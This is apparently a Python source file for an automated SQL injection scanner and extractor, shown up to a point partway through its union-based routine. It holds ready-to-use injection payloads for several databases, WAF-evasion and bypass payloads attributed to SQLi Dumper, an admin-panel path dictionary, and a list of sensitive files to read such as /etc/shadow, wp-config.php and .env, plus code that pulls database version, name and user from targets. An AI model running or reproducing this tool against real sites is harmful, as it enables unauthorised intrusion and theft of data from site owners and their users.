"""
SQL Injection Scanner — Error-based + Union-based detection

Tests URLs for SQL injection vulnerabilities using:
1. Error-based detection (FLOOR/RAND/GROUP BY for MySQL, equivalent for others)
2. Union-based detection (ORDER BY column counting + UNION SELECT)
3. Boolean-based blind detection (AND 1=1 vs AND 1=2 response diff)
4. Time-based blind detection (SLEEP/WAITFOR/pg_sleep)

Supports: MySQL, MSSQL, PostgreSQL, Oracle
"""

import re
import asyncio
import aiohttp
import random
import time
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from loguru import logger


@dataclass
class SQLiResult:
    """Result of SQL injection testing."""
    url: str
    parameter: str
    vulnerable: bool = False
    injection_type: str = ""  # error, union, boolean, time
    dbms: str = ""  # mysql, mssql, postgresql, oracle
    technique: str = ""
    column_count: int = 0
    injectable_columns: List[int] = field(default_factory=list)
    db_version: str = ""
    current_db: str = ""
    current_user: str = ""
    error_message: str = ""
    payload_used: str = ""
    confidence: float = 0.0  # 0.0 - 1.0


class SQLiScanner:
    """SQL injection vulnerability scanner."""

    # DBMS error signatures
    DBMS_ERRORS = {
        "mysql": [
            re.compile(r"SQL syntax.*?MySQL", re.I),
            re.compile(r"Warning.*?\Wmysql_", re.I),
            re.compile(r"Warning.*?\Wmysqli_", re.I),
            re.compile(r"MySQLSyntaxErrorException", re.I),
            re.compile(r"valid MySQL result", re.I),
            re.compile(r"check the manual that corresponds to your MySQL", re.I),
            re.compile(r"Unknown column", re.I),
            re.compile(r"mysql_fetch", re.I),
            re.compile(r"mysql_num_rows", re.I),
            re.compile(r"MySQL server version", re.I),
            re.compile(r"MariaDB server version", re.I),
            re.compile(r"You have an error in your SQL syntax", re.I),
            re.compile(r"com\.mysql\.jdbc", re.I),
            re.compile(r"Unclosed quotation mark", re.I),
        ],
        "mssql": [
            re.compile(r"Driver.*? SQL Server", re.I),
            re.compile(r"OLE DB.*? SQL Server", re.I),
            re.compile(r"\bSQL Server\b.*?Driver", re.I),
            re.compile(r"Warning.*?\W(mssql|sqlsrv)_", re.I),
            re.compile(r"\bSQL Server\b.*?\d", re.I),
            re.compile(r"Microsoft SQL Native Client error", re.I),
            re.compile(r"ODBC SQL Server Driver", re.I),
            re.compile(r"SQLServer JDBC Driver", re.I),
            re.compile(r"Unclosed quotation mark after.*?character string", re.I),
            re.compile(r"Procedure or function .+ expects parameter", re.I),
            re.compile(r"Conversion failed when converting", re.I),
        ],
        "postgresql": [
            re.compile(r"PostgreSQL.*?ERROR", re.I),
            re.compile(r"Warning.*?\Wpg_", re.I),
            re.compile(r"valid PostgreSQL result", re.I),
            re.compile(r"Npgsql", re.I),
            re.compile(r"PG::SyntaxError", re.I),
            re.compile(r"org\.postgresql\.util\.PSQLException", re.I),
            re.compile(r"ERROR:\s+syntax error at or near", re.I),
            re.compile(r"ERROR:\s+parser:", re.I),
        ],
        "oracle": [
            re.compile(r"\bORA-\d{5}", re.I),
            re.compile(r"Oracle error", re.I),
            re.compile(r"Oracle.*?Driver", re.I),
            re.compile(r"Warning.*?\Woci_", re.I),
            re.compile(r"Warning.*?\Wora_", re.I),
            re.compile(r"oracle\.jdbc", re.I),
            re.compile(r"quoted string not properly terminated", re.I),
        ],
        "sqlite": [
            re.compile(r"SQLite/JDBCDriver", re.I),
            re.compile(r"SQLite\.Exception", re.I),
            re.compile(r"System\.Data\.SQLite\.SQLiteException", re.I),
            re.compile(r"Warning.*?\Wsqlite_", re.I),
            re.compile(r"Warning.*?\WSQLite3::", re.I),
            re.compile(r"\[SQLITE_ERROR\]", re.I),
            re.compile(r"SQLite error \d+:", re.I),
        ],
    }

    # Error-based payloads (FLOOR/RAND technique from XDumpGO)
    ERROR_PAYLOADS = {
        "mysql": [
            # FLOOR/RAND (classic MySQL error-based)
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
            # EXTRACTVALUE
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))-- -",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))-- -",
            # UPDATEXML
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)-- -",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)-- -",
            # Double query
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)-- -",
        ],
        "mssql": [
            "' AND 1=CONVERT(int,(SELECT @@version))-- -",
            "' AND 1=CONVERT(int,(SELECT DB_NAME()))-- -",
            "' AND 1=CONVERT(int,(SELECT SYSTEM_USER))-- -",
            "' HAVING 1=1-- -",
            "' GROUP BY 1 HAVING 1=1-- -",
        ],
        "postgresql": [
            "' AND 1=CAST((SELECT version()) AS int)-- -",
            "' AND 1=CAST((SELECT current_database()) AS int)-- -",
            "' AND 1=CAST((SELECT current_user) AS int)-- -",
            "'::int-- -",
        ],
        "oracle": [
            "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
            "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
        ],
    }
    
    # Heuristic pre-check payloads
    HEURISTIC_PAYLOADS = [
        "'",
        "\"",
        "' OR '1'='1",
        "1 OR 1=1",
        "' OR ''='",
        "1'1",
        "1 AND 1=1",
        "1 AND 1=2",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "-1 OR 1=1",
        "1)) OR 1=1--",
    ]
    
    # Time-based payloads
    TIME_PAYLOADS = {
        "mysql": [
            "' AND SLEEP({delay})-- -",
            "' AND (SELECT * FROM (SELECT SLEEP({delay}))a)-- -",
            "1' AND SLEEP({delay})-- -",
            " AND SLEEP({delay})-- -",
            "' OR SLEEP({delay})-- -",
            "1 AND BENCHMARK(5000000,SHA1('test'))-- -",
        ],
        "mssql": [
            "'; WAITFOR DELAY '0:0:{delay}'-- -",
            "' AND 1=(SELECT 1 FROM (SELECT SLEEP({delay}))x)-- -",
        ],
        "postgresql": [
            "'; SELECT pg_sleep({delay})-- -",
            "' AND 1=(SELECT 1 FROM pg_sleep({delay}))-- -",
        ],
        "oracle": [
            "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})-- -",
        ],
    }
    
    # WAF evasion encodings (from SQLi Dumper v8.5)
    EVASION_TECHNIQUES = {
        "comment": lambda p: p.replace(" ", "/**/"),
        "double_url": lambda p: p.replace("'", "%2527"),
        "mixed_case": lambda p: re.sub(r'(SELECT|UNION|FROM|WHERE|AND|OR|INSERT|UPDATE|DELETE|DROP|TABLE|CONCAT|GROUP|HAVING|ORDER|BY|INTO)', 
                                        lambda m: ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(m.group())), p, flags=re.I),
        "inline_comment": lambda p: p.replace("UNION", "UN/*!50000ION*/").replace("SELECT", "SE/*!50000LECT*/"),
        "url_encoded_comment": lambda p: p.replace(" ", "%2f**%2f"),  # /**/ URL encoded
    }
    
    # WAF Bypass Union Payloads (from SQLi Dumper v8.5)
    WAF_BYPASS_UNION_PAYLOADS = [
        # Standard variants
        "999999.9 uNiOn aLl sElEcT {cols}-- -",
        "-1 uNiOn aLl sElEcT {cols}-- -",
        "999999.9' uNiOn aLl sElEcT {cols} aNd '0'='0",
        "-1' uNiOn aLl sElEcT {cols} aNd '1'='1",
        "999999.9\" uNiOn aLl sElEcT {cols} aNd \"0\"=\"0",
        # Inline comment obfuscation (WAF bypass)
        "999999.9/**/uNiOn/**/aLl/**/sElEcT/**/{cols}-- -",
        "-1/**/uNiOn/**/aLl/**/sElEcT/**/{cols}-- -",
        "999999.9'/**/uNiOn/**/aLl/**/sElEcT/**/{cols}/**/aNd/**/'0'='0",
        "-1'/**/uNiOn/**/aLl/**/sElEcT/**/{cols}-- -",
        # URL encoded comment bypass
        "999999.9%2f**%2fuNiOn%2f**%2faLl%2f**%2fsElEcT%2f**%2f{cols}-- -",
        "-1%2f**%2fuNiOn%2f**%2faLl%2f**%2fsElEcT%2f**%2f{cols}-- -",
        # Mixed techniques
        "0x0/**/UniOn/**/aLl/**/SeLeCt/**/{cols}-- -",
        "null/**/uNiOn/**/aLl/**/sElEcT/**/{cols}-- -",
        "(null)/**/uNiOn/**/aLl/**/sElEcT/**/{cols}-- -",
        # Parenthesis bypass
        "999999.9)/**/uNiOn/**/aLl/**/sElEcT/**/{cols}/**/and/**/(1=1",
        "-1)/**/uNiOn/**/aLl/**/sElEcT/**/{cols}/**/and/**/(1=1",
        # Double dash variations
        "999999.9'/**/uNiOn/**/aLl/**/sElEcT/**/{cols}#",
        "-1'/**/uNiOn/**/aLl/**/sElEcT/**/{cols};--",
        # Concat versions for data extraction
        "999999.9'/**/uNiOn/**/aLl/**/sElEcT/**/{cols_concat}-- -",
    ]
    
    # WAF Bypass Error-based Payloads
    WAF_BYPASS_ERROR_PAYLOADS = {
        "mysql": [
            # FLOOR/RAND with obfuscation
            "'/**/aNd/**/(sElEcT/**/1/**/fRoM/**/(sElEcT/**/cOuNt(*),cOnCaT((sElEcT/**/vErSiOn()),fLoOr(rAnD(0)*2))x/**/fRoM/**/iNfOrMaTiOn_sChEmA.tAbLeS/**/gRoUp/**/bY/**/x)a)-- -",
            "'%2f**%2faNd%2f**%2f(sElEcT%2f**%2f1%2f**%2ffRoM%2f**%2f(sElEcT%2f**%2fcOuNt(*),cOnCaT((sElEcT%2f**%2fdAtAbAsE()),fLoOr(rAnD(0)*2))x%2f**%2ffRoM%2f**%2fiNfOrMaTiOn_sChEmA.tAbLeS%2f**%2fgRoUp%2f**%2fbY%2f**%2fx)a)-- -",
            # EXTRACTVALUE with obfuscation
            "'/**/aNd/**/eXtRaCtVaLuE(1,cOnCaT(0x7e,(sElEcT/**/vErSiOn()),0x7e))-- -",
            "'/**/aNd/**/eXtRaCtVaLuE(1,cOnCaT(0x7e,(sElEcT/**/dAtAbAsE()),0x7e))-- -",
            # UPDATEXML with obfuscation  
            "'/**/aNd/**/uPdAtExMl(1,cOnCaT(0x7e,(sElEcT/**/@@vErSiOn),0x7e),1)-- -",
            "'/**/aNd/**/uPdAtExMl(1,cOnCaT(0x7e,(sElEcT/**/uSeR()),0x7e),1)-- -",
        ],
        "mssql": [
            "'/**/aNd/**/1=cOnVeRt(iNt,(sElEcT/**/@@vErSiOn))-- -",
            "'/**/aNd/**/1=cOnVeRt(iNt,(sElEcT/**/dB_nAmE()))-- -",
            "'/**/aNd/**/1=cOnVeRt(iNt,(sElEcT/**/sYsTeM_uSeR))-- -",
        ],
        "postgresql": [
            "'/**/aNd/**/1=cAsT((sElEcT/**/vErSiOn())/**/aS/**/iNt)-- -",
            "'/**/aNd/**/1=cAsT((sElEcT/**/cUrReNt_dAtAbAsE())/**/aS/**/iNt)-- -",
        ],
    }
    
    # Admin Panel Paths (from SQLi Dumper dictionary - 297 paths with dynamic extensions)
    ADMIN_PATHS = [
        # Core admin paths
        "admin/", "administrator/", "admin.php", "admin.html", "admin.asp", "admin.aspx", "admin.htm",
        "login/", "login.php", "login.html", "login.asp", "login.aspx", "login.htm",
        "admin/login.php", "admin/login.html", "admin/login.htm", "admin/admin-login.php",
        "admin/admin.php", "admin/index.php", "admin/home.php", "admin/account.html", "admin/account.php",
        "admin/controlpanel.php", "admin/controlpanel.html", "admin/controlpanel.htm",
        "admin/cp.php", "admin/adminLogin.php", "admin/adminLogin.html", "admin/admin_login.php",
        "administrator/login.php", "administrator/index.php", "administrator/account.php",
        "administration/", "administration.php",
        "admin_area/", "admin_area/admin.php", "admin_area/login.php", "admin_area/index.php",
        "admincp/", "admincp/index.php", "admincp/login.php",
        "adminitem/", "adminitem.php", "adminitems/", "adminitems.php",
        # Extended paths from SQLi Dumper
        "adm/", "adm.php", "adm/index.php", "adminLogin/", "adminlogin.php",
        "cp/", "cpanel/", "controlpanel/", "controlpanel.php", "control/", "control.php",
        "manage/", "manage.php", "management/", "management.php", "manager/", "manager.php",
        "superuser/", "superuser.php", "supervisor/", "sysadm/", "sysadm.php", "sysadmin/",
        "panel/", "panel.php", "uvpanel/",
        "member/", "member.php", "members/", "members.php",
        "user/", "user.php", "users/", "users.php",
        "account/", "accounts/", "accounts.php",
        "signin/", "signin.php", "sign-in/", "sign-in.php", "sign_in/", "sign_in.php",
        "log-in/", "log-in.php", "log_in/", "log_in.php",
        "relogin/", "relogin.php", "relogin.htm", "relogin.html",
        # CMS specific
        "wp-admin/", "wp-login.php", "blog/wp-login.php",
        "bb-admin/", "bb-admin/login.php", "bb-admin/admin.php", "bb-admin/admin.html",
        "joomla/administrator/", "administrator/index.php",
        "typo3/", "drupal/admin/", "bitrix/admin/", "modx/manager/",
        "magento/admin/", "magento/index.php/admin/",
        # Check functions
        "check.php", "checklogin.php", "checkuser.php", "checkadmin.php", "isadmin.php",
        "authenticate.php", "authentication.php", "auth.php", "auth/",
        "processlogin.php", "dologin.php",
        # User admin
        "user/admin.php", "users/admin.php", "member/login.php", "member/admin.php",
        "registration/", "usercp/", "useradmin/", "customer/", "customer/login/",
        # Backend/Dashboard
        "backend/", "backend/login.php", "backend/admin.php", "dashboard/", "dashboard.php",
        "cms/", "cms/admin/", "system/", "system/admin/",
        "secure/", "secure/admin/", "private/", "private/admin/",
        # Database admin
        "phpmyadmin/", "pma/", "myadmin/", "mysql/", "dbadmin/", "db/", "sql/", "database/",
        # Letmein/access paths
        "letmein/", "letmein.php", "access/", "access.php", "superman/",
        # Numbered admin
        "admin1/", "admin2/", "admin3/", "admin4/", "admin5/",
        # More paths
        "site/admin/", "portal/admin/", "app/admin/", "webadmin/", "adminsite/",
        "admin/dashboard/", "admin/panel/", "admin/cp/", "modcp/", "moderator/",
        # ASP specific
        "admin/admin.asp", "admin/login.asp", "admin/index.asp",
        "administrator/admin.asp", "administrator/login.asp",
        "admin/adminLogin.asp", "admin_area/admin.asp", "admin_area/login.asp",
    ]
    
    # LFI/File Read Paths (from SQLi Dumper dic_file_dump.txt - 206 paths)
    LFI_PATHS = [
        # System files
        "/etc/passwd", "/etc/shadow", "/etc/group",
        "/etc/security/group", "/etc/security/passwd", "/etc/security/user",
        "/etc/security/environ", "/etc/security/limits",
        "/usr/lib/security/mkuser.default",
        # Apache logs
        "/apache/logs/access.log", "/apache/logs/error.log",
        "/etc/httpd/logs/access_log", "/etc/httpd/logs/access.log",
        "/etc/httpd/logs/error_log", "/etc/httpd/logs/error.log",
        "/var/www/logs/access_log", "/var/www/logs/access.log",
        "/var/www/logs/error_log", "/var/www/logs/error.log",
        "/usr/local/apache/logs/access_log", "/usr/local/apache/logs/access.log",
        "/usr/local/apache/logs/error_log", "/usr/local/apache/logs/error.log",
        "/var/log/apache/access_log", "/var/log/apache/access.log",
        "/var/log/apache2/access_log", "/var/log/apache2/access.log",
        "/var/log/apache/error_log", "/var/log/apache/error.log",
        "/var/log/apache2/error_log", "/var/log/apache2/error.log",
        "/var/log/access_log", "/var/log/access.log",
        "/var/log/error_log", "/var/log/error.log",
        "/var/log/httpd/access_log", "/var/log/httpd/access.log",
        "/var/log/httpd/error_log", "/var/log/httpd/error.log",
        "/apache2/logs/error.log", "/apache2/logs/access.log",
        "/logs/error.log", "/logs/access.log",
        "/usr/local/apache2/logs/access_log", "/usr/local/apache2/logs/access.log",
        "/usr/local/apache2/logs/error_log", "/usr/local/apache2/logs/error.log",
        "/opt/lampp/logs/access_log", "/opt/lampp/logs/error_log",
        "/opt/xampp/logs/access_log", "/opt/xampp/logs/error_log",
        "/opt/lampp/logs/access.log", "/opt/lampp/logs/error.log",
        "/opt/xampp/logs/access.log", "/opt/xampp/logs/error.log",
        # Apache config
        "/usr/local/apache/conf/httpd.conf", "/usr/local/apache2/conf/httpd.conf",
        "/etc/httpd/conf/httpd.conf", "/etc/apache/conf/httpd.conf",
        "/etc/apache2/httpd.conf", "/usr/local/apache/httpd.conf",
        "/usr/local/apache2/httpd.conf", "/usr/local/httpd/conf/httpd.conf",
        "/etc/apache2/conf/httpd.conf", "/etc/httpd/httpd.conf",
        "/etc/httpd.conf", "/opt/apache/conf/httpd.conf", "/opt/apache2/conf/httpd.conf",
        "/var/www/conf/httpd.conf", "/private/etc/httpd/httpd.conf",
        # PHP config
        "/etc/php.ini", "/bin/php.ini", "/etc/httpd/php.ini",
        "/usr/lib/php.ini", "/usr/lib/php/php.ini",
        "/usr/local/etc/php.ini", "/usr/local/lib/php.ini",
        "/usr/local/php/lib/php.ini", "/usr/local/php4/lib/php.ini", "/usr/local/php5/lib/php.ini",
        "/usr/local/apache/conf/php.ini",
        "/etc/php4/apache/php.ini", "/etc/php4/apache2/php.ini",
        "/etc/php5/apache/php.ini", "/etc/php5/apache2/php.ini",
        "/etc/php/php.ini", "/etc/php/apache/php.ini", "/etc/php/apache2/php.ini",
        "/web/conf/php.ini", "/usr/local/Zend/etc/php.ini",
        "/opt/xampp/etc/php.ini", "/var/local/www/conf/php.ini",
        "/etc/php/cgi/php.ini", "/etc/php4/cgi/php.ini", "/etc/php5/cgi/php.ini",
        # cPanel
        "/usr/local/cpanel/logs", "/usr/local/cpanel/logs/stats_log",
        "/usr/local/cpanel/logs/access_log", "/usr/local/cpanel/logs/error_log",
        "/usr/local/cpanel/logs/license_log", "/usr/local/cpanel/logs/login_log",
        "/var/cpanel/cpanel.config",
        # MySQL
        "/var/log/mysql/mysql-bin.log", "/var/log/mysql.log",
        "/var/log/mysqlderror.log", "/var/log/mysql/mysql.log",
        "/var/log/mysql/mysql-slow.log", "/var/mysql.log",
        "/var/lib/mysql/my.cnf", "/etc/mysql/my.cnf", "/etc/my.cnf",
        # FTP configs/logs
        "/etc/logrotate.d/proftpd", "/www/logs/proftpd.system.log",
        "/var/log/proftpd", "/etc/proftp.conf", "/etc/proftpd/proftpd.conf",
        "/etc/vhcs2/proftpd/proftpd.conf", "/etc/proftpd/modules.conf",
        "/var/log/vsftpd.log", "/etc/vsftpd.chroot_list",
        "/etc/logrotate.d/vsftpd.log", "/etc/vsftpd/vsftpd.conf", "/etc/vsftpd.conf",
        "/etc/chrootUsers", "/var/log/xferlog", "/var/adm/log/xferlog",
        "/etc/wu-ftpd/ftpaccess", "/etc/wu-ftpd/ftphosts", "/etc/wu-ftpd/ftpusers",
        # Pure-FTPd
        "/usr/sbin/pure-config.pl", "/usr/etc/pure-ftpd.conf",
        "/etc/pure-ftpd/pure-ftpd.conf", "/usr/local/etc/pure-ftpd.conf",
        "/usr/local/etc/pureftpd.pdb", "/usr/local/pureftpd/etc/pureftpd.pdb",
        "/etc/pure-ftpd.conf", "/etc/pure-ftpd/pure-ftpd.pdb",
        "/etc/pureftpd.pdb", "/etc/pureftpd.passwd",
        "/var/log/pure-ftpd/pure-ftpd.log", "/logs/pure-ftpd.log",
        "/var/log/pureftpd.log", "/var/log/ftp-proxy/ftp-proxy.log",
        "/var/log/ftplog", "/etc/ftpchroot", "/etc/ftphosts",
        # Mail logs
        "/var/log/exim_mainlog", "/var/log/exim/mainlog", "/var/log/maillog",
        "/var/log/exim_paniclog", "/var/log/exim/paniclog", "/var/log/exim/rejectlog",
        # Proc filesystem (Linux)
        "/proc/self/environ", "/proc/self/cmdline", "/proc/self/fd/0",
        "/proc/self/fd/1", "/proc/self/fd/2",
        "/proc/version", "/proc/cpuinfo", "/proc/meminfo",
        # Web app configs
        "wp-config.php", "../wp-config.php", "../../wp-config.php",
        "config.php", "../config.php", "../../config.php",
        "configuration.php", "../configuration.php",
        "settings.php", "../settings.php", "../../settings.php",
        "config.inc.php", "../config.inc.php",
        "db.php", "../db.php", "database.php", "../database.php",
        ".env", "../.env", "../../.env",
        ".htaccess", "../.htaccess",
    ]

    def __init__(self, timeout: int = 15, max_concurrent: int = 10, 
                 delay: int = 5, user_agent: str = None, proxy: str = None):
        self.timeout = timeout
        self.max_concurrent = max_concurrent
        self.delay = delay
        self.proxy = proxy
        self.user_agent = user_agent or random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        ])
        self.semaphore = asyncio.Semaphore(max_concurrent)

    def _parse_url(self, url: str) -> Tuple[str, Dict[str, List[str]]]:
        """Parse URL and extract base URL + parameters."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        base = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', '', ''))
        return base, params

    def _build_url(self, base: str, params: Dict[str, List[str]]) -> str:
        """Rebuild URL from base + parameters."""
        flat = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        query = urlencode(flat)
        return f"{base}?{query}" if query else base

    async def _fetch(self, url: str, session: aiohttp.ClientSession) -> Tuple[str, float]:
        """Fetch a URL and return (body, response_time)."""
        try:
            async with self.semaphore:
                start = time.time()
                async with session.get(url, allow_redirects=True, ssl=False, proxy=self.proxy) as resp:
                    body = await resp.text(errors="ignore")
                    elapsed = time.time() - start
                    return body, elapsed
        except asyncio.TimeoutError:
            return "", self.timeout
        except Exception as e:
            logger.debug(f"Fetch error for {url}: {e}")
            return "", 0

    def _detect_dbms(self, body: str) -> Optional[str]:
        """Detect DBMS from error messages in response body."""
        for dbms, patterns in self.DBMS_ERRORS.items():
            for pattern in patterns:
                if pattern.search(body):
                    return dbms
        return None

    def _extract_error_data(self, body: str) -> Dict[str, str]:
        """Extract version/db/user from error-based response."""
        data = {}
        
        # Extract version from FLOOR/RAND output (format: data1)
        version_match = re.search(r"Duplicate entry '(.+?)1' for key", body, re.I)
        if version_match:
            data["extracted"] = version_match.group(1)
        
        # Extract from EXTRACTVALUE/UPDATEXML (format: ~data~)
        extract_match = re.search(r"XPATH syntax error: '~(.+?)~'", body, re.I)
        if extract_match:
            data["extracted"] = extract_match.group(1)
        
        # MSSQL CONVERT error
        convert_match = re.search(r"Conversion failed when converting.*?value '(.+?)'", body, re.I)
        if convert_match:
            data["extracted"] = convert_match.group(1)
        
        # PostgreSQL CAST error
        cast_match = re.search(r'invalid input syntax for.*?"(.+?)"', body, re.I)
        if cast_match:
            data["extracted"] = cast_match.group(1)
        
        return data

    async def test_heuristic(self, url: str, session: aiohttp.ClientSession) -> Tuple[bool, Optional[str], str]:
        """Quick heuristic test to check if parameter is injectable.
        
        Returns:
            (is_injectable, dbms, parameter_name)
        """
        base, params = self._parse_url(url)
        if not params:
            return False, None, ""
        
        for param_name in params:
            # Test each parameter
            for payload in self.HEURISTIC_PAYLOADS[:4]:  # Quick test with first 4
                test_params = params.copy()
                original_value = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
                test_params[param_name] = [str(original_value) + payload]
                test_url = self._build_url(base, test_params)
                
                body, _ = await self._fetch(test_url, session)
                if not body:
                    continue
                
                dbms = self._detect_dbms(body)
                if dbms:
                    logger.info(f"Heuristic hit: {url} param={param_name} dbms={dbms}")
                    return True, dbms, param_name
        
        return False, None, ""

    async def test_error_based(self, url: str, param_name: str, dbms: str,
                               session: aiohttp.ClientSession) -> Optional[SQLiResult]:
        """Test error-based SQL injection.
        
        Uses FLOOR/RAND for MySQL, CONVERT for MSSQL, CAST for PostgreSQL.
        
        Returns:
            SQLiResult if vulnerable, None otherwise
        """
        base, params = self._parse_url(url)
        payloads = self.ERROR_PAYLOADS.get(dbms, self.ERROR_PAYLOADS["mysql"])
        
        for payload in payloads:
            test_params = params.copy()
            original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
            test_params[param_name] = [str(original) + payload]
            test_url = self._build_url(base, test_params)
            
            body, _ = await self._fetch(test_url, session)
            if not body:
                continue
            
            extracted = self._extract_error_data(body)
            if extracted:
                result = SQLiResult(
                    url=url,
                    parameter=param_name,
                    vulnerable=True,
                    injection_type="error",
                    dbms=dbms,
                    technique="FLOOR/RAND" if "FLOOR" in payload else
                             "EXTRACTVALUE" if "EXTRACTVALUE" in payload else
                             "UPDATEXML" if "UPDATEXML" in payload else
                             "CONVERT" if "CONVERT" in payload else
                             "CAST" if "CAST" in payload else "error",
                    payload_used=payload,
                    confidence=0.95,
                )
                
                val = extracted.get("extracted", "")
                if "version" in payload.lower() or "@@version" in payload.lower() or "banner" in payload.lower():
                    result.db_version = val
                elif "database" in payload.lower() or "db_name" in payload.lower() or "current_database" in payload.lower():
                    result.current_db = val
                elif "user" in payload.lower() or "system_user" in payload.lower():
                    result.current_user = val
                
                logger.info(f"Error-based SQLi found: {url} param={param_name} extracted={val}")
                return result
        
        return None

    async def test_union_based(self, url: str, param_name: str, dbms: str,
                                session: aiohttp.ClientSession) -> Optional[SQLiResult]:
        """Test union-based SQL injection.
        
        Steps:
        1. Find column count via ORDER BY
        2. Find injectable columns via UNION SELECT
        3. Extract data through injectable columns
        
        Returns:
            SQLiResult if vulnerable, None otherwise
        """
        base, params = self._parse_url(url)
        
        # Get original response for comparison
        original_body, _ = await self._fetch(url, session)
        if not original_body:
            return None
        original_len = len(original_body)
        
        # Step 1: Find column count with ORDER BY
        column_count = 0
        for i in range(1, 51):  # Test up to 50 columns
            test_params = params.copy()
            original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
            test_params[param_name] = [f"{original}' ORDER BY {i}-- -"]
            test_url = self._build_url(base, test_params)
            
            body, _ = await self._fetch(test_url, session)
            if not body:
                continue
            
            # Check for ORDER BY error (means we exceeded column count)
            if any(p.search(body) for dbms_name, patterns in self.DBMS_ERRORS.items() 
                   for p in patterns) or "Unknown column" in body:
                column_count = i - 1
                break
            
            # If response drastically changes, might have hit the limit
            if abs(len(body) - original_len) > original_len * 0.5 and i > 1:
                column_count = i - 1
                break
        
        if column_count < 1:
            # Try numeric instead of string
            for i in range(1, 30):
                test_params = params.copy()
                original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
                test_params[param_name] = [f"{original} ORDER BY {i}-- -"]
                test_url = self._build_url(base, test_params)
                
                body, _ = await self._fetch(test_url, session)
                if not body:
                    continue
                
                if any(p.search(body) for dbms_name, patterns in self.DBMS_ERRORS.items() 
                       for p in patterns):
                    column_count = i - 1
                    break
        
        if column_count < 1:
            return None
        
        logger.info(f"Found {column_count} columns for {url} param={param_name}")
        
        # Step 2: Find injectable columns with UNION SELECT
        null_list = ["NULL"] * column_count
        marker = f"0x{random.randint(100000, 999999):x}"
        injectable_cols = []
        
        for col_idx in range(column_count):
            test_cols = null_list.copy()
            test_cols[col_idx] = f"CONCAT({marker},0x7e,{marker})"
            
            union_query = f"' UNION ALL SELECT {','.join(test_cols)}-- -"
            
            test_params = params.copy()
            original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
            test_params[param_name] = [f"{original}{union_query}"]
            test_url = self._build_url(base, test_params)
            
            body, _ = await self._fetch(test_url, session)
            if body and marker.replace("0x", "") in body:
                injectable_cols.append(col_idx)
        
        if not injectable_cols:
            # Try without quotes (numeric parameter)
            for col_idx in range(column_count):
                test_cols = null_list.copy()
                test_cols[col_idx] = f"CONCAT({marker},0x7e,{marker})"
                
                union_query = f" UNION ALL SELECT {','.join(test_cols)}-- -"
                
                test_params = params.copy()
                original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
                test_params[param_name] = [f"-1{union_query}"]
                test_url = self._build_url(base, test_params)
                
                body, _ = await self._fetch(test_url, session)
                if body and marker.replace("0x", "") in body:
                    injectable_cols.append(col_idx)
        
        if not injectable_cols:
            return None
        
        logger.info(f"Injectable columns: {injectable_cols} for {url}")
        
        # Step 3: Extract basic info through injectable column
        result = SQLiResult(
            url=url,
            parameter=param_name,
            vulnerable=True,
            injection_type="union",
            dbms=dbms,
            technique="UNION ALL SELECT",
            column_count=column_count,
            injectable_columns=injectable_cols,
            confidence=0.90,
        )
        
        # Try to extract version, database, user
        injectable_col = injectable_cols[0]
        
        info_queries = {
            "mysql": [
                ("version()", "db_version"),
                ("database()", "current_db"),
                ("current_user()", "current_user"),
            ],
            "mssql": [
                ("@@version", "db_version"),
                ("DB_NAME()", "current_db"),
                ("SYSTEM_USER", "current_user"),
            ],
            "postgresql": [
                ("version()", "db_version"),
                ("current_database()", "current_db"),
                ("current_user", "current_user"),
            ],
            "oracle": [
                ("banner FROM v$version WHERE ROWNUM=1", "db_version"),
                ("SYS_CONTEXT('USERENV','DB_NAME') FROM dual", "current_db"),
                ("SYS_CONTEXT('USERENV','CURRENT_USER') FROM dual", "current_user"),
            ],
        }
        
        unique_start = f"0x{random.randint(100000, 999999):x}"
        unique_end = f"0x{random.randint(100000, 999999):x}"
        
        for query, attr in info_queries.get(dbms, info_queries["mysql"]):
            test_cols = null_list.copy()
            if dbms == "oracle":
                test_cols[injectable_col] = f"CONCAT(CONCAT({unique_start},0x7c),({query}))"
            else:
